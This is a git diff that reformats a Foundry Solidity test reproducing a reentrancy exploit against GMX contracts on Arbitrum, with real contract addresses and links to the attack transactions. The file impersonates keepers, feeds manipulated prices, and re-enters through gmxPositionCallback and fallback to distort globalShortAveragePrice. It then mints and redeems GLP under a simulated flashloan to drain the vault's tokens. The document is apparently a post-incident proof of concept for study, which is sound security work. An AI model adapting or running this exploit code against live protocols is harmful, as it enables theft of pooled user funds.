@@ -5,8 +5,18 @@ import "forge-std/Test.sol";
 import "../interface.sol";
 
 interface IRewardRouterV2 {
-    function mintAndStakeGlp(address _token, uint256 _amount, uint256 _minUsdg, uint256 _minGlp) external returns (uint256);
-    function unstakeAndRedeemGlp(address _tokenOut, uint256 _glpAmount, uint256 _minOut, address _receiver) external returns (uint256);
+    function mintAndStakeGlp(
+        address _token,
+        uint256 _amount,
+        uint256 _minUsdg,
+        uint256 _minGlp
+    ) external returns (uint256);
+    function unstakeAndRedeemGlp(
+        address _tokenOut,
+        uint256 _glpAmount,
+        uint256 _minOut,
+        address _receiver
+    ) external returns (uint256);
 }
 
 interface IGMXPositionRouter {
@@ -24,9 +34,13 @@ interface IGMXPositionRouter {
         address _callbackTarget
     ) external payable returns (bytes32);
     function minExecutionFee() external view returns (uint256);
-    function executeDecreasePositions(uint256 _endIndex, address payable _executionFeeReceiver) external;
+    function executeDecreasePositions(
+        uint256 _endIndex,
+        address payable _executionFeeReceiver
+    ) external;
     function getRequestQueueLengths() external view returns (uint256, uint256, uint256, uint256);
 }
+
 interface IGMXOrderBook {
     function createIncreaseOrder(
         address[] memory _path,
@@ -44,9 +58,15 @@ interface IGMXOrderBook {
 
     function minExecutionFee() external view returns (uint256);
     function minPurchaseTokenAmountUsd() external view returns (uint256);
-    function swapOrdersIndex(address _account) external view returns (uint256);
-    function increaseOrdersIndex(address _account) external view returns (uint256);
-    function decreaseOrdersIndex(address _account) external view returns (uint256);
+    function swapOrdersIndex(
+        address _account
+    ) external view returns (uint256);
+    function increaseOrdersIndex(
+        address _account
+    ) external view returns (uint256);
+    function decreaseOrdersIndex(
+        address _account
+    ) external view returns (uint256);
     function createDecreaseOrder(
         address _indexToken,
         uint256 _sizeDelta,
@@ -57,20 +77,40 @@ interface IGMXOrderBook {
         bool _triggerAboveThreshold
     ) external payable;
 }
+
 interface IGMXRouter {
-    function approvePlugin(address _plugin) external;
+    function approvePlugin(
+        address _plugin
+    ) external;
 }
 
 interface IGMXPositionManager {
-    function executeIncreaseOrder(address _account, uint256 _orderIndex, address payable _feeReceiver) external;
-    function executeDecreaseOrder(address _account, uint256 _orderIndex, address payable _feeReceiver) external;
-
+    function executeIncreaseOrder(
+        address _account,
+        uint256 _orderIndex,
+        address payable _feeReceiver
+    ) external;
+    function executeDecreaseOrder(
+        address _account,
+        uint256 _orderIndex,
+        address payable _feeReceiver
+    ) external;
 }
 
 interface IGMXVault {
-    function tokenToUsdMin(address _token, uint256 _amount) external view returns (uint256);
-    function getPosition(address _account, address _collateralToken, address _indexToken, bool _isLong) external view returns (uint256, uint256, uint256, uint256, uint256, uint256, bool, uint256);
-    function globalShortAveragePrices(address _indexToken) external view returns (uint256);
+    function tokenToUsdMin(
+        address _token,
+        uint256 _amount
+    ) external view returns (uint256);
+    function getPosition(
+        address _account,
+        address _collateralToken,
+        address _indexToken,
+        bool _isLong
+    ) external view returns (uint256, uint256, uint256, uint256, uint256, uint256, bool, uint256);
+    function globalShortAveragePrices(
+        address _indexToken
+    ) external view returns (uint256);
     function increasePosition(
         address _account,
         address _collateralToken,
@@ -87,23 +127,45 @@ interface IGMXVault {
         bool _isLong,
         address _receiver
     ) external returns (uint256);
-    function poolAmounts(address _token) external view returns (uint256);
-    function reservedAmounts(address _token) external view returns (uint256);
-    function getMaxPrice(address _token) external view returns (uint256);
-    function getMinPrice(address _token) external view returns (uint256);
+    function poolAmounts(
+        address _token
+    ) external view returns (uint256);
+    function reservedAmounts(
+        address _token
+    ) external view returns (uint256);
+    function getMaxPrice(
+        address _token
+    ) external view returns (uint256);
+    function getMinPrice(
+        address _token
+    ) external view returns (uint256);
 }
 
 interface IGMXShortsTracker {
-    function updateGlobalShortData(address _account, address _collateralToken, address _indexToken, bool _isLong, uint256 _sizeDelta, uint256 _markPrice, bool _isIncrease) external;
+    function updateGlobalShortData(
+        address _account,
+        address _collateralToken,
+        address _indexToken,
+        bool _isLong,
+        uint256 _sizeDelta,
+        uint256 _markPrice,
+        bool _isIncrease
+    ) external;
 }
 
 interface IGMXGlpManager {
-    function getGlobalShortDelta(address _token) external view returns (bool, uint256);
-    function getGlobalShortAveragePrice(address _token) external view returns (uint256);
-    function getAumInUsdg(bool _maximise) external view returns (uint256);
+    function getGlobalShortDelta(
+        address _token
+    ) external view returns (bool, uint256);
+    function getGlobalShortAveragePrice(
+        address _token
+    ) external view returns (uint256);
+    function getAumInUsdg(
+        bool _maximise
+    ) external view returns (uint256);
 }
 
-interface IGMXFastPriceFeed{
+interface IGMXFastPriceFeed {
     function setPricesWithBitsAndExecute(
         uint256 _priceBits,
         uint256 _timestamp,
@@ -115,11 +177,12 @@ interface IGMXFastPriceFeed{
 }
 
 interface IRewardTracker {
-    function stakedAmounts(address _account) external view returns (uint256);
+    function stakedAmounts(
+        address _account
+    ) external view returns (uint256);
 }
 
 contract ContractTest is Test {
-
     IGMXOrderBook orderBook_ = IGMXOrderBook(0x09f77E8A13De9a35a7231028187e9fD5DB8a2ACB);
     IGMXVault vault_ = IGMXVault(0x489ee077994B6658eAfA855C308275EAd8097C4A);
     IGMXRouter router_ = IGMXRouter(0xaBBc5F99639c9B6bCb58544ddf04EFA6802F4064);
@@ -146,12 +209,12 @@ contract ContractTest is Test {
     address orderBookKeeper_ = 0xd4266F8F82F7405429EE18559e548979D49160F3;
 
     bool isProfit = false;
-    
+
     // 区块355878385时，eth价格是2652.39
     function setUp() public {
         //vm.createSelectFork("arbitrum", 355878385 - 1);
         vm.createSelectFork("https://virtual.arbitrum.us-west.rpc.tenderly.co/792782e8-383f-423c-b407-df70006f98d3");
-        deal(address(usdc_), address(this), 3001000000);
+        deal(address(usdc_), address(this), 3_001_000_000);
         vm.deal(address(this), 2 ether);
         router_.approvePlugin(address(orderBook_));
         router_.approvePlugin(address(positionRouter_));
@@ -159,8 +222,6 @@ contract ContractTest is Test {
         usdc_.approve(address(glp_manager_), type(uint256).max);
         frax_.approve(address(rewardRouterV2_), type(uint256).max);
         frax_.approve(address(glp_manager_), type(uint256).max);
-
-
     }
 
     function testExploit() public {
@@ -180,14 +241,20 @@ contract ContractTest is Test {
             keeperExecuteOpenETHPosition();
         }
 
-        console2.log("glp_manager_.getGlobalShortAveragePrice(address(btc_)) = ", glp_manager_.getGlobalShortAveragePrice(address(btc_)));
+        console2.log(
+            "glp_manager_.getGlobalShortAveragePrice(address(btc_)) = ",
+            glp_manager_.getGlobalShortAveragePrice(address(btc_))
+        );
 
         createCloseETHPosition();
-        for(uint i = 0; i< 5; i++) {
+        for (uint256 i = 0; i < 5; i++) {
             keeperExecuteCloseETHPosition();
             keeperExecuteCloseBTCPosition();
         }
-        console2.log("glp_manager_.getGlobalShortAveragePrice(address(btc_)) = ", glp_manager_.getGlobalShortAveragePrice(address(btc_)));
+        console2.log(
+            "glp_manager_.getGlobalShortAveragePrice(address(btc_)) = ",
+            glp_manager_.getGlobalShortAveragePrice(address(btc_))
+        );
         isProfit = true;
         keeperExecuteCloseETHPosition();
         console2.log("-------- attack after --------");
@@ -210,14 +277,14 @@ contract ContractTest is Test {
         address[] memory path = new address[](1);
         path[0] = address(weth_);
         orderBook_.createIncreaseOrder{value: 0.1003 ether}(
-            path, 
-            100000000000000000, // amountIn
+            path,
+            100_000_000_000_000_000, // amountIn
             address(weth_), // indexToken
             0, // minOut
-            531064000000000000000000000000000, // sizeDelta，2.003倍的杠杆
+            531_064_000_000_000_000_000_000_000_000_000, // sizeDelta，2.003倍的杠杆
             address(weth_), // collateralToken
             true, // isLong
-            1500000000000000000000000000000000, // triggerPrice
+            1_500_000_000_000_000_000_000_000_000_000_000, // triggerPrice
             true, // triggerAboveThreshold
             orderBook_.minExecutionFee() * 3, // executionFee
             true // shouldWrap
@@ -227,36 +294,54 @@ contract ContractTest is Test {
     // https://arbiscan.io/tx/0x28a000501ef8e3364b0e7f573256b04b87d9a8e8173410c869004b987bf0beef
     function keeperExecuteOpenETHPosition() public {
         vm.startPrank(orderBookKeeper_);
-        positionManager_.executeIncreaseOrder(address(this), orderBook_.increaseOrdersIndex(address(this)) - 1, payable(orderBookKeeper_));
+        positionManager_.executeIncreaseOrder(
+            address(this), orderBook_.increaseOrdersIndex(address(this)) - 1, payable(orderBookKeeper_)
+        );
         vm.stopPrank();
     }
 
-    // https://app.blocksec.com/explorer/tx/arbitrum/0x20abfeff0206030986b05422080dc9e81dbb53a662fbc82461a47418decc49af    
+    // https://app.blocksec.com/explorer/tx/arbitrum/0x20abfeff0206030986b05422080dc9e81dbb53a662fbc82461a47418decc49af
     function createCloseETHPosition() public {
-        (uint256 size, uint256 collateral, uint256 entryPrice, uint256 reserveAmount, uint256 realisedPnl, uint256 entryFundingRate, bool isLong, uint256 lastIncreasedTime) = vault_.getPosition(address(this), address(weth_), address(weth_), true);
+        (
+            uint256 size,
+            uint256 collateral,
+            uint256 entryPrice,
+            uint256 reserveAmount,
+            uint256 realisedPnl,
+            uint256 entryFundingRate,
+            bool isLong,
+            uint256 lastIncreasedTime
+        ) = vault_.getPosition(address(this), address(weth_), address(weth_), true);
         orderBook_.createDecreaseOrder{value: orderBook_.minExecutionFee() * 3}(
             address(weth_),
             size / 2,
             address(weth_),
-            collateral/2,
+            collateral / 2,
             true,
-            1500000000000000000000000000000000,
-            true);
+            1_500_000_000_000_000_000_000_000_000_000_000,
+            true
+        );
     }
 
     // https://app.blocksec.com/explorer/tx/arbitrum/0x1f00da742318ad1807b6ea8283bfe22b4a8ab0bc98fe428fbfe443746a4a7353?line=162
     function keeperExecuteCloseETHPosition() public {
         vm.startPrank(orderBookKeeper_);
-        positionManager_.executeDecreaseOrder(address(this), orderBook_.decreaseOrdersIndex(address(this)) - 1, payable(orderBookKeeper_));
+        positionManager_.executeDecreaseOrder(
+            address(this), orderBook_.decreaseOrdersIndex(address(this)) - 1, payable(orderBookKeeper_)
+        );
     }
-
 
     // https://app.blocksec.com/explorer/tx/arbitrum/0x222cdae82a8d28e53a2bddfb34ae5d1d823c94c53f8a7abc179d47a2c994464e?line=134
     function keeperExecuteCloseBTCPosition() public {
-        (uint256 increasePositionRequestKeysStart, uint256 increasePositionRequestKeysLength, uint256 decreasePositionRequestKeysStart, uint256 decreasePositionRequestKeysLength) = positionRouter_.getRequestQueueLengths();
+        (
+            uint256 increasePositionRequestKeysStart,
+            uint256 increasePositionRequestKeysLength,
+            uint256 decreasePositionRequestKeysStart,
+            uint256 decreasePositionRequestKeysLength
+        ) = positionRouter_.getRequestQueueLengths();
         vm.startPrank(routerPositionKeeper_);
         fastPriceFeed_.setPricesWithBitsAndExecute(
-            650780127152856667663437440412910, 
+            650_780_127_152_856_667_663_437_440_412_910,
             block.timestamp,
             increasePositionRequestKeysStart + increasePositionRequestKeysLength,
             decreasePositionRequestKeysStart + decreasePositionRequestKeysLength,
@@ -269,7 +354,11 @@ contract ContractTest is Test {
 
     // Key point: globalShortAveragePrice has already been changed
     // This is GMX’s callback function, gmxPositionCallback, which is called when a market order is closed.
-    function gmxPositionCallback(bytes32 positionKey, bool isExecuted, bool isIncrease) external {
+    function gmxPositionCallback(
+        bytes32 positionKey,
+        bool isExecuted,
+        bool isIncrease
+    ) external {
         createCloseETHPosition();
     }
 
@@ -277,24 +366,29 @@ contract ContractTest is Test {
     // This is also a critical reentrancy point.
     fallback() external payable {
         console2.log("in reentrancy point.");
-        if(isProfit) {
+        if (isProfit) {
             profitAttack();
-        }else{
-            console2.log("glp_manager_.getGlobalShortAveragePrice(address(btc_)) = ", glp_manager_.getGlobalShortAveragePrice(address(btc_)));
+        } else {
+            console2.log(
+                "glp_manager_.getGlobalShortAveragePrice(address(btc_)) = ",
+                glp_manager_.getGlobalShortAveragePrice(address(btc_))
+            );
             usdc_.transfer(address(vault_), usdc_.balanceOf(address(this)));
-            vault_.increasePosition(address(this), address(usdc_), address(btc_), 90030000000000000000000000000000000, false);
+            vault_.increasePosition(
+                address(this), address(usdc_), address(btc_), 90_030_000_000_000_000_000_000_000_000_000_000, false
+            );
             address[] memory path = new address[](1);
             path[0] = address(usdc_);
-            positionRouter_.createDecreasePosition{value: 3000000000000000}(
+            positionRouter_.createDecreasePosition{value: 3_000_000_000_000_000}(
                 path,
                 address(btc_),
                 0,
-                90030000000000000000000000000000000,
+                90_030_000_000_000_000_000_000_000_000_000_000,
                 false,
                 address(this),
-                120000000000000000000000000000000000,
+                120_000_000_000_000_000_000_000_000_000_000_000,
                 0,
-                3000000000000000,
+                3_000_000_000_000_000,
                 false,
                 address(this)
             );
@@ -302,14 +396,16 @@ contract ContractTest is Test {
     }
 
     // https://app.blocksec.com/explorer/tx/arbitrum/0x03182d3f0956a91c4e4c8f225bbc7975f9434fab042228c7acdc5ec9a32626ef
-    function profitAttack() public{
+    function profitAttack() public {
         console2.log("******* start profitAttack *******");
         // flashloan usdc 7538567_619570
-        deal(address(usdc_), address(this), 7_538_567_619570); 
-        uint256 glpAmount = rewardRouterV2_.mintAndStakeGlp(address(usdc_), 6000000000000, 0, 0);
+        deal(address(usdc_), address(this), 7_538_567_619_570);
+        uint256 glpAmount = rewardRouterV2_.mintAndStakeGlp(address(usdc_), 6_000_000_000_000, 0, 0);
         usdc_.transfer(address(vault_), usdc_.balanceOf(address(this)));
 
-        vault_.increasePosition(address(this), address(usdc_), address(btc_), 15385676195700000000000000000000000000, false);
+        vault_.increasePosition(
+            address(this), address(usdc_), address(btc_), 15_385_676_195_700_000_000_000_000_000_000_000_000, false
+        );
         getProfitForETH();
         getProfitForBTC();
         getProfitForUSDC();
@@ -319,19 +415,36 @@ contract ContractTest is Test {
         getProfitForUSDT();
         getProfitForFRAX();
         getProfitForDAI();
-        vault_.decreasePosition(address(this), address(usdc_), address(btc_), 0, 15385676195700000000000000000000000000, false, address(this));
+        vault_.decreasePosition(
+            address(this),
+            address(usdc_),
+            address(btc_),
+            0,
+            15_385_676_195_700_000_000_000_000_000_000_000_000,
+            false,
+            address(this)
+        );
 
-        for(uint i = 0; i < 10; i++) {            
-            
-            rewardRouterV2_.mintAndStakeGlp(address(frax_), 9000000000000000000000000, 0, 0);
-            usdc_.transfer(address(vault_), 500000000000);
-            vault_.increasePosition(address(this), address(usdc_), address(btc_), 12500000000000000000000000000000000000, false);
+        for (uint256 i = 0; i < 10; i++) {
+            rewardRouterV2_.mintAndStakeGlp(address(frax_), 9_000_000_000_000_000_000_000_000, 0, 0);
+            usdc_.transfer(address(vault_), 500_000_000_000);
+            vault_.increasePosition(
+                address(this), address(usdc_), address(btc_), 12_500_000_000_000_000_000_000_000_000_000_000_000, false
+            );
             getProfitForFRAX();
-            vault_.decreasePosition(address(this), address(usdc_), address(btc_), 0, 12500000000000000000000000000000000000, false, address(this));
+            vault_.decreasePosition(
+                address(this),
+                address(usdc_),
+                address(btc_),
+                0,
+                12_500_000_000_000_000_000_000_000_000_000_000_000,
+                false,
+                address(this)
+            );
             console2.log("glpAmount = ", IERC20(address(rewardTracker_)).balanceOf(address(this)));
         }
         getProfitForUSDC();
-        usdc_.transfer(address(0x1), 7_538_567_619570); // repay flashloan
+        usdc_.transfer(address(0x1), 7_538_567_619_570); // repay flashloan
         console2.log("profit weth_ of Attacker ", weth_.balanceOf(address(this)) / 10 ** weth_.decimals());
         console2.log("profit btc_ of Attacker ", btc_.balanceOf(address(this)) / 10 ** btc_.decimals());
         console2.log("profit usdc_ of Attacker ", usdc_.balanceOf(address(this)) / 10 ** usdc_.decimals());
@@ -353,6 +466,7 @@ contract ContractTest is Test {
         uint256 glpAmount = usdgAmount * glpTotal / aumInUsdg; // 1e18
         rewardRouterV2_.unstakeAndRedeemGlp(address(weth_), glpAmount, 0, address(this));
     }
+
     function getProfitForBTC() public {
         uint256 profit_delta = vault_.poolAmounts(address(btc_)) - vault_.reservedAmounts(address(btc_));
         uint256 price = vault_.getMaxPrice(address(btc_)); // 1e30
@@ -362,6 +476,7 @@ contract ContractTest is Test {
         uint256 glpAmount = usdgAmount * glpTotal / aumInUsdg; // 1e18
         rewardRouterV2_.unstakeAndRedeemGlp(address(btc_), glpAmount, 0, address(this));
     }
+
     function getProfitForUSDC() public {
         uint256 profit_delta = vault_.poolAmounts(address(usdc_)) - vault_.reservedAmounts(address(usdc_));
         uint256 price = vault_.getMaxPrice(address(usdc_)); // 1e30
@@ -371,6 +486,7 @@ contract ContractTest is Test {
         uint256 glpAmount = usdgAmount * glpTotal / aumInUsdg; // 1e18
         rewardRouterV2_.unstakeAndRedeemGlp(address(usdc_), glpAmount, 0, address(this));
     }
+
     function getProfitForUSDE() public {
         uint256 profit_delta = vault_.poolAmounts(address(usde_)) - vault_.reservedAmounts(address(usde_));
         uint256 price = vault_.getMaxPrice(address(usde_)); // 1e30
@@ -380,6 +496,7 @@ contract ContractTest is Test {
         uint256 glpAmount = usdgAmount * glpTotal / aumInUsdg; // 1e18
         rewardRouterV2_.unstakeAndRedeemGlp(address(usde_), glpAmount, 0, address(this));
     }
+
     function getProfitForLINK() public {
         uint256 profit_delta = vault_.poolAmounts(address(link_)) - vault_.reservedAmounts(address(link_));
         uint256 price = vault_.getMaxPrice(address(link_)); // 1e30
@@ -389,6 +506,7 @@ contract ContractTest is Test {
         uint256 glpAmount = usdgAmount * glpTotal / aumInUsdg; // 1e18
         rewardRouterV2_.unstakeAndRedeemGlp(address(link_), glpAmount, 0, address(this));
     }
+
     function getProfitForUNI() public {
         uint256 profit_delta = vault_.poolAmounts(address(uni_)) - vault_.reservedAmounts(address(uni_));
         uint256 price = vault_.getMaxPrice(address(uni_)); // 1e30
@@ -398,6 +516,7 @@ contract ContractTest is Test {
         uint256 glpAmount = usdgAmount * glpTotal / aumInUsdg; // 1e18
         rewardRouterV2_.unstakeAndRedeemGlp(address(uni_), glpAmount, 0, address(this));
     }
+
     function getProfitForUSDT() public {
         uint256 profit_delta = vault_.poolAmounts(address(usdt_)) - vault_.reservedAmounts(address(usdt_));
         uint256 price = vault_.getMaxPrice(address(usdt_)); // 1e30
@@ -407,6 +526,7 @@ contract ContractTest is Test {
         uint256 glpAmount = usdgAmount * glpTotal / aumInUsdg; // 1e18
         rewardRouterV2_.unstakeAndRedeemGlp(address(usdt_), glpAmount, 0, address(this));
     }
+
     function getProfitForFRAX() public {
         uint256 profit_delta = vault_.poolAmounts(address(frax_)) - vault_.reservedAmounts(address(frax_));
         uint256 price = vault_.getMaxPrice(address(frax_)); // 1e30
@@ -416,6 +536,7 @@ contract ContractTest is Test {
         uint256 glpAmount = usdgAmount * glpTotal / aumInUsdg; // 1e18
         rewardRouterV2_.unstakeAndRedeemGlp(address(frax_), glpAmount, 0, address(this));
     }
+
     function getProfitForDAI() public {
         uint256 profit_delta = vault_.poolAmounts(address(dai_)) - vault_.reservedAmounts(address(dai_));
         uint256 price = vault_.getMaxPrice(address(dai_)); // 1e30
